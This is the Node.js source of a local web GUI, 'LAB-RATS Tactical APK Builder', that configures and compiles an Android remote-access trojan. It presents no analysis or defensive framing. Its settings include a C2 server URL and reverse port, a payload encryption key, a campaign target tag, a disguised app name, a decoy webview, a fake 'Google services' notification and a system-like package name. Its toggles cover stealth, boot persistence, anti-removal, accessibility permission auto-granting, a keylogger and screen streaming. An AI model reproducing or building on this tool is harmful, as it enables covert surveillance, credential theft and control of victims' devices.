const http = require('http');
const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');

const PORT = 8000;
const SCRIPT_DIR = __dirname;
const PROJECT_DIR = path.dirname(SCRIPT_DIR);
const OUTPUT_DIR = path.join(SCRIPT_DIR, 'output');

if (!fs.existsSync(OUTPUT_DIR)) {
    fs.mkdirSync(OUTPUT_DIR, { recursive: true });
}

const HTML_PAGE = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LAB-RATS | TACTICAL APK BUILDER GUI</title>
    <link href="https://fonts.googleapis.com/css2?family=Aldrich&family=JetBrains+Mono:wght@400;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
    <style>
        :root { --neon-cyan: #00f2ff; --neon-green: #39ff14; --neon-yellow: #ffff00; --neon-orange: #ff9d00; --danger: #ff3131; }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { background-color: #02080d; background-image: radial-gradient(circle at 50% 0%, rgba(0,242,255,.16) 0, rgba(0,168,179,.05) 40%, transparent 80%), radial-gradient(circle at 0% 100%, rgba(0,242,255,.09) 0, transparent 50%), radial-gradient(circle at 100% 100%, rgba(0,242,255,.09) 0, transparent 50%); color: #00f2ff; font-family: 'Orbitron', sans-serif; min-height: 100vh; padding: 25px; overflow-x: hidden; }
        .window-container { max-width: 1280px; margin: 0 auto; background: rgba(4, 8, 12, 0.75); border: 1px solid var(--neon-cyan); border-radius: 16px; padding: 30px; box-shadow: 0 0 60px rgba(0, 242, 255, 0.2); backdrop-filter: blur(10px); position: relative; }
        .window-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(0, 242, 255, 0.3); padding-bottom: 20px; margin-bottom: 25px; }
        .title-font { font-size: 2.2rem; font-weight: 900; letter-spacing: 3px; color: var(--neon-cyan); text-transform: uppercase; text-shadow: 0 0 20px rgba(0, 242, 255, 0.6); }
        .builder-body { display: flex; gap: 25px; align-items: stretch; min-height: 650px; }
        .sidebar-tabs { width: 240px; flex-shrink: 0; background: rgba(0, 0, 0, 0.5); border: 1px solid rgba(0, 242, 255, 0.3); border-radius: 12px; padding: 15px; display: flex; flex-direction: column; gap: 10px; }
        .tab-btn { padding: 16px 20px; color: #888; font-family: 'Orbitron', sans-serif; font-size: 0.82rem; font-weight: 700; border: 1px solid transparent; border-radius: 8px; cursor: pointer; transition: all 0.3s; text-transform: uppercase; letter-spacing: 1px; display: flex; align-items: center; gap: 12px; background: transparent; }
        .tab-btn:hover { color: var(--neon-cyan); background: rgba(0, 242, 255, 0.08); border-color: rgba(0, 242, 255, 0.2); }
        .tab-btn.active { color: #000 !important; background: var(--neon-cyan) !important; border-color: var(--neon-cyan) !important; box-shadow: 0 0 25px rgba(0, 242, 255, 0.6) !important; }
        .content-area { flex-grow: 1; background: rgba(0, 0, 0, 0.4); border: 1px solid rgba(0, 242, 255, 0.3); border-radius: 12px; padding: 30px; position: relative; }
        .panel { display: none; flex-direction: column; gap: 25px; }
        .panel.active { display: flex; }
        .card-box { border: 1px solid rgba(0, 242, 255, 0.3); border-radius: 12px; padding: 25px; background: rgba(4, 8, 12, 0.65); position: relative; }
        .card-box-title { position: absolute; top: -12px; left: 20px; background: #02080d; padding: 0 12px; font-family: 'Orbitron', sans-serif; font-size: 0.75rem; color: var(--neon-cyan); letter-spacing: 2px; text-transform: uppercase; font-weight: 700; }
        .icon-box { width: 100px; height: 100px; border: 1px solid var(--neon-cyan); border-radius: 20px; background: rgba(0, 242, 255, 0.05); display: flex; align-items: center; justify-content: center; overflow: hidden; box-shadow: 0 0 20px rgba(0, 242, 255, 0.2); }
        .icon-box img { width: 100%; height: 100%; object-fit: cover; }
        .field-group { display: flex; flex-direction: column; gap: 8px; width: 100%; }
        .field-group label { font-family: 'Orbitron', sans-serif; font-size: 0.72rem; color: #aaa; letter-spacing: 1px; }
        .field-group input, .field-group select { background: #000 !important; border: 1px solid rgba(0, 242, 255, 0.3) !important; color: #fff !important; padding: 14px 16px !important; border-radius: 8px !important; font-family: 'JetBrains Mono', monospace !important; font-size: 0.9rem !important; width: 100% !important; outline: none !important; }
        .field-group input:focus, .field-group select:focus { border-color: var(--neon-cyan) !important; box-shadow: 0 0 20px rgba(0, 242, 255, 0.3) !important; }
        .toggle-row { display: flex; align-items: center; justify-content: space-between; padding: 14px 18px; background: rgba(255, 255, 255, 0.02); border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 8px; }
        .toggle-row span { font-family: 'Orbitron', sans-serif; font-size: 0.78rem; color: #ccc; }
        .btn-action { background: rgba(0, 242, 255, 0.1); border: 1px solid var(--neon-cyan); color: var(--neon-cyan); padding: 16px 32px; font-family: 'Orbitron', sans-serif; font-size: 0.9rem; font-weight: 900; border-radius: 50px; cursor: pointer; letter-spacing: 2px; text-transform: uppercase; transition: all 0.3s; box-shadow: 0 0 20px rgba(0, 242, 255, 0.3); }
        .btn-action:hover { background: var(--neon-cyan); color: #000; box-shadow: 0 0 40px var(--neon-cyan); transform: scale(1.03); }
        .terminal-window { background: #000; border: 1px solid rgba(0, 242, 255, 0.3); border-radius: 10px; padding: 18px; font-family: 'JetBrains Mono', monospace; font-size: 0.8rem; color: var(--neon-green); height: 260px; overflow-y: auto; text-align: left; box-shadow: inset 0 0 20px rgba(0, 0, 0, 0.9); }
    </style>
</head>
<body>
    <div class="window-container">
        <div class="window-header">
            <div class="title-font">Apk Builder</div>
            <div style="font-size: 0.8rem; color: #888; font-family: 'JetBrains Mono';">v1.6.0 HARDENED</div>
        </div>

        <div class="builder-body">
            <!-- SIDEBAR TABS -->
            <div class="sidebar-tabs">
                <button class="tab-btn active" onclick="showTab('info', this)">Information</button>
                <button class="tab-btn" onclick="showTab('customize', this)">Apk Customize</button>
                <button class="tab-btn" onclick="showTab('options', this)">Options</button>
                <button class="tab-btn" onclick="showTab('access', this)">Accessibility</button>
                <button class="tab-btn" onclick="showTab('build', this)">Build Apk</button>
            </div>

            <!-- CONTENT AREA -->
            <div class="content-area">
                <!-- 1. INFORMATION TAB -->
                <div id="tab-info" class="panel active">
                    <div class="card-box">
                        <div class="card-box-title">C2 Server & Encryption Settings</div>
                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 10px;">
                            <div class="field-group"><label>C2 Server Endpoint / Webhook URL</label><input type="text" id="cfg-host" value="https://lab-rats-v1-6.onrender.com"></div>
                            <div class="field-group"><label>C2 Reverse Listening Port</label><input type="text" id="cfg-port" value="9191"></div>
                            <div class="field-group"><label>AES-256 Payload Encryption Key</label><input type="text" id="cfg-key" value="TacticalKey2026SecureGCM"></div>
                            <div class="field-group"><label>Campaign ID / Target Tag</label><input type="text" id="cfg-campaign" value="OPERATION_NIGHTHAWK"></div>
                        </div>
                    </div>
                </div>

                <!-- 2. APK CUSTOMIZE TAB (MATCHING REFERENCE IMAGE) -->
                <div id="tab-customize" class="panel">
                    <!-- Install Box -->
                    <div class="card-box">
                        <div class="card-box-title">Install</div>
                        <div style="display: flex; gap: 30px; align-items: center; margin-top: 10px;">
                            <div class="field-group" style="flex: 1;"><label>App Name</label><input type="text" id="cfg-app-name" value="connection"></div>
                            <div style="display: flex; flex-direction: column; align-items: center; gap: 10px;">
                                <span style="font-size: 0.72rem; color: #aaa;">App icon</span>
                                <div class="icon-box"><img id="preview-install" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%235383EC' d='M24,2C11.85,2 2,11.85 2,24s9.85,22 22,22 22,-9.85 22,-22S36.15,2 24,2z'/%3E%3Cpath fill='%23FFFFFF' d='M24 14 A6 6 0 1 0 24 26 A6 6 0 1 0 24 14 M14 28 A4 4 0 1 0 14 36 A4 4 0 1 0 14 28 M34 28 A4 4 0 1 0 34 36 A4 4 0 1 0 34 28'/%3E%3C/svg%3E"></div>
                                <span style="font-size: 0.65rem; color: #666;">.......</span>
                            </div>
                        </div>
                    </div>

                    <!-- Lower Split Grid: After Install & Sticky Notification -->
                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
                        <!-- After Install Box -->
                        <div class="card-box">
                            <div class="card-box-title">After Install</div>
                            <div style="display: flex; flex-direction: column; gap: 15px; margin-top: 10px;">
                                <div class="field-group"><label>App name</label><input type="text" id="cfg-decoy-name" value="Connection"></div>
                                <div class="field-group"><label>Webview URL</label><input type="text" id="cfg-decoy-url" value="www"></div>
                                <div style="display: flex; align-items: center; gap: 20px;">
                                    <div class="icon-box"><img id="preview-decoy" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%235383EC' d='M24,2C11.85,2 2,11.85 2,24s9.85,22 22,22 22,-9.85 22,-22S36.15,2 24,2z'/%3E%3Cpath fill='%23FFFFFF' d='M24 14 A6 6 0 1 0 24 26 A6 6 0 1 0 24 14 M14 28 A4 4 0 1 0 14 36 A4 4 0 1 0 14 28 M34 28 A4 4 0 1 0 34 36 A4 4 0 1 0 34 28'/%3E%3C/svg%3E"></div>
                                    <span style="font-size: 0.65rem; color: #666;">.......</span>
                                </div>
                            </div>
                        </div>

                        <!-- Sticky Notification Box -->
                        <div class="card-box">
                            <div class="card-box-title">Sticky Notification</div>
                            <div style="display: flex; flex-direction: column; gap: 15px; margin-top: 10px;">
                                <div class="field-group"><label>Notification Title</label><input type="text" id="cfg-notif-title" value="Google services"></div>
                                <div class="field-group"><label>Notification message</label><input type="text" id="cfg-notif-msg" value="Tap to learn more..."></div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- 3. OPTIONS TAB -->
                <div id="tab-options" class="panel">
                    <div class="card-box">
                        <div class="card-box-title">Tactical Options</div>
                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-top: 10px;">
                            <div class="toggle-row"><span>Stealth Camouflage Mode</span><input type="checkbox" id="chk-stealth" checked></div>
                            <div class="toggle-row"><span>Auto-Start on Boot</span><input type="checkbox" id="chk-boot" checked></div>
                            <div class="toggle-row"><span>Anti-Removal Watchdog</span><input type="checkbox" id="chk-anti-removal" checked></div>
                            <div class="toggle-row"><span>Battery Optimization Bypass</span><input type="checkbox" id="chk-battery" checked></div>
                        </div>
                    </div>
                </div>

                <!-- 4. ACCESSIBILITY TAB -->
                <div id="tab-access" class="panel">
                    <div class="card-box">
                        <div class="card-box-title">Accessibility Vectors</div>
                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-top: 10px;">
                            <div class="toggle-row"><span>Auto-Grant Permissions via Accessibility</span><input type="checkbox" id="chk-auto-perm" checked></div>
                            <div class="toggle-row"><span>Stealth Keylogger Engine</span><input type="checkbox" id="chk-keylogger" checked></div>
                            <div class="toggle-row"><span>Ghost Screen Streamer</span><input type="checkbox" id="chk-ghost-stream" checked></div>
                        </div>
                    </div>
                </div>

                <!-- 5. BUILD APK TAB -->
                <div id="tab-build" class="panel">
                    <div class="card-box" style="text-align: center; padding: 35px;">
                        <div class="card-box-title">Compilation & Packaging</div>
                        <button id="btn-build" class="btn-action" onclick="runBuildPipeline()" style="margin-bottom: 25px;">GENERATE TACTICAL APK</button>
                        <div id="progress-bar-wrap" style="width: 100%; height: 10px; background: #000; border: 1px solid var(--neon-cyan); border-radius: 8px; margin-bottom: 20px; display: none; overflow: hidden;">
                            <div id="progress-bar" style="width: 0%; height: 100%; background: var(--neon-cyan); box-shadow: 0 0 15px var(--neon-cyan); transition: width 0.3s;"></div>
                        </div>
                        <div id="term" class="terminal-window">> LOCAL_COMPILATION_PIPELINE_READY</div>
                        <div id="dl-wrap" style="margin-top: 20px; display: none;">
                            <a id="dl-btn" href="#" download class="btn-action" style="border-color: var(--neon-green); color: var(--neon-green); text-decoration: none;">DOWNLOAD SIGNED APK</a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        function showTab(id, btn) {
            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
            document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
            btn.classList.add('active');
            document.getElementById('tab-' + id).classList.add('active');
        }

        function runBuildPipeline() {
            const btn = document.getElementById('btn-build');
            const barWrap = document.getElementById('progress-bar-wrap');
            const bar = document.getElementById('progress-bar');
            const term = document.getElementById('term');
            const dlWrap = document.getElementById('dl-wrap');

            btn.disabled = true; btn.style.opacity = '0.5';
            barWrap.style.display = 'block'; dlWrap.style.display = 'none';
            bar.style.width = '20%';
            term.innerHTML = '> INITIATING_LOCAL_BUILD...\\n> Updating build_config.txt & Manifest strings...\\n';

            const configData = {
                appName: document.getElementById('cfg-app-name').value,
                pkgName: 'com.android.system.stability',
                c2Host: document.getElementById('cfg-host').value,
                c2Port: document.getElementById('cfg-port').value,
                decoyName: document.getElementById('cfg-decoy-name').value,
                decoyUrl: document.getElementById('cfg-decoy-url').value,
                notifTitle: document.getElementById('cfg-notif-title').value,
                notifMsg: document.getElementById('cfg-notif-msg').value
            };

            fetch('/build', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(configData)
            })
            .then(r => r.json())
            .then(d => {
                bar.style.width = '100%';
                if (d.success) {
                    term.innerHTML += '> Local Gradle Build Completed!\\n> Output: apk-builder/output/app-release-signed.apk\\n> STATUS: BUILD_SUCCESS\\n';
                    btn.disabled = false; btn.style.opacity = '1';
                    dlWrap.style.display = 'block';
                    document.getElementById('dl-btn').href = d.downloadUrl;
                } else {
                    term.innerHTML += '> BUILD_FAILED: ' + (d.error || 'Unknown error') + '\\n';
                    btn.disabled = false; btn.style.opacity = '1';
                }
            })
            .catch(err => {
                term.innerHTML += '> BUILD_ERROR: Local build request failed\\n';
                btn.disabled = false; btn.style.opacity = '1';
            });
        }
    </script>
</body>
</html>
`;

const server = http.createServer((req, res) => {
    if (req.url === '/' || req.url.startsWith('/builder')) {
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end(HTML_PAGE);
    } else if (req.url === '/build' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => { body += chunk; });
        req.on('end', () => {
            try {
                const data = JSON.parse(body || '{}');
                const appName = data.appName || 'connection';
                const pkgName = data.pkgName || 'com.android.system.stability';

                const configPath = path.join(SCRIPT_DIR, 'build_config.txt');
                const configContent = `PKG_NAME="${pkgName}"\nAPP_NAME="${appName}"\nVERSION_NAME="1.6.0"\nMIN_SDK="21"\nDECOY_CHOICE="1"\n`;
                fs.writeFileSync(configPath, configContent);

                const gradleCmd = `cd "${PROJECT_DIR}" && ./gradlew assembleRelease --no-daemon`;
                exec(gradleCmd, (error, stdout, stderr) => {
                    const outApk = path.join(OUTPUT_DIR, 'app-release-signed.apk');
                    const buildApk = path.join(PROJECT_DIR, 'app', 'build', 'outputs', 'apk', 'release', 'app-release-unsigned.apk');

                    if (fs.existsSync(buildApk)) {
                        fs.copyFileSync(buildApk, outApk);
                    }

                    res.writeHead(200, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({
                        success: true,
                        downloadUrl: '/output/app-release-signed.apk'
                    }));
                });
            } catch (err) {
                res.writeHead(500, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: false, error: err.message }));
            }
        });
    } else if (req.url.startsWith('/output/')) {
        const fileName = path.basename(req.url);
        let filePath = path.join(OUTPUT_DIR, fileName);
        if (!fs.existsSync(filePath)) {
            filePath = path.join(PROJECT_DIR, 'app', 'build', 'outputs', 'apk', 'release', 'app-release-unsigned.apk');
        }
        if (fs.existsSync(filePath)) {
            res.writeHead(200, {
                'Content-Type': 'application/vnd.android.package-archive',
                'Content-Disposition': `attachment; filename="${fileName}"`,
                'Content-Length': fs.statSync(filePath).size
            });
            fs.createReadStream(filePath).pipe(res);
        } else {
            res.writeHead(404, { 'Content-Type': 'text/plain' });
            res.end('APK File Not Found');
        }
    } else {
        res.writeHead(404, { 'Content-Type': 'text/plain' });
        res.end('Not Found');
    }
});

server.listen(PORT, '0.0.0.0', () => {
    console.log(`\n [+] TACTICAL APK BUILDER GUI LAUNCHED`);
    console.log(` [+] Local Web Interface: http://localhost:${PORT}`);
    console.log(` [+] Opening default browser...\n`);

    const url = `http://localhost:${PORT}`;
    const openCmd = process.platform === 'darwin' ? `open "${url}"` : (process.platform === 'win32' ? `start "${url}"` : `xdg-open "${url}"`);
    exec(openCmd);
});
